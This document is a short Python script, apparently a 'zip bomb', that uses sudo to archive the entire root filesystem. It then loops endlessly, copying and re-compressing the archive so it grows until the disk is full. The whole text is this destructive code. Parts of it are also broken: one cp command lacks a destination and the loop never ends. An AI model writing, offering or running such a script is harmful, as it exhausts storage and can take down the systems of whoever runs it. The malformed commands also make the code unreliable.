import os
os.system('sudo tar -zcvf zbomb1.tar.gz /*')
while True:
  os.system('mkdir zbomb && cp zbomb1.tar.gz')
  i = 1
  while not i == 49:
    i += 1
    os.system("cd zbomb && cp zbomb1.tar.gz zbomb" + str(i) + ".tar.gz")
  os.system("tar -zcvf zbomb1.tar.gz zbomb")
